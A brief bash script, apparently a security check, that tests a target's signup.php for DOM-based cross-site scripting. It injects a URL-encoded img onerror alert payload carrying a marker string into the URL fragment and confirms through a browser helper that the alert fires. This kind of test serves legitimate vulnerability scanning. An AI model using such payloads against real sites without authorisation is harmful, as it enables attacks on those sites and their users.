#!/usr/bin/env bash
set -eu; . "$(dirname "$0")/_lib.sh"
M="DOMXSS-PROVEN-7f3a"; P="%3Cimg%20src%3Dx%20onerror%3Dalert('$M')%3E"
curl -s "$TARGET/signup.php" | grep -q "$M" && exit 1
browser_dialog "$TARGET/signup.php#$P" "$M"
